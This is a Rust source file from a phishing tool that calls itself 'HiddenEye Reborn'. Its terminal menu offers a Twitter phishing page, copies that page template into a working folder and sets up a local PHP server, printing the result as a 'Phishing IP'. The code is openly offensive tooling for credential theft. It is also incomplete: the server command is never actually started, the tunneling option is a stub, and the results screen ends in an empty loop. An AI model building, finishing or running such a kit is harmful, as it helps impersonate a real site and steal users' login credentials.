use colored::Colorize;
use std::process::Command;
#[path = "extra.rs"] mod extra;

pub fn results_page() {
  print!("\x1B[2J\x1B[1;1H");
  println!("{}", "HiddenEye Reborn".red());
  println!("{}", "-----------------------".blue());
  println!("{}{}", "Phishing IP: ".red(), "localhost:8000".blue());
  println!("");
    loop {};
}

pub fn localhost_setup() {
  Command::new("cp")
    .arg("-r")
    .arg("src/pages/twitter")
    .arg("src/workingFolder")
    .output();
  Command::new("php")
    .arg("-S")
    .arg("localhost:8000");
}

pub fn start_tunneling(x: i32) {
  if x == 1 {
    localhost_setup();
    results_page();
  }
}

pub fn tunneling_options() {
  print!("\x1B[2J\x1B[1;1H");
  println!("{}", "HiddenEye Reborn".red());
  println!("{}", "-----------------------".blue());
  println!("{}{}{}{}", "{".red(), "1".blue(), "}".red(), " LocalHost".blue());
  println!("{}{}{}{}", "{".red(), "2".blue(), "}".red(), " LocalTunnel".blue());
  println!();
  print!("{}", "Which tunneling option? ".red());
  let mut answer = extra::hidden_input();
  if answer == "1" {
    start_tunneling(1);
  }
  else if answer == "2" {
    println!("You chose LocalTunnel");
  }
}

pub fn start_main_menu() {
  print!("\x1B[2J\x1B[1;1H");
  println!("{}", "HiddenEye Reborn".red());
  println!("{}", "-----------------------".blue());
  println!("{}{}{}{}", "{".red(), "1".blue(), "}".red(), " Twitter".blue());
  println!();
  print!("{}", "Which site? ".red());
  let mut answer = extra::hidden_input();
  if answer == "1" {
    tunneling_options()
  }
}
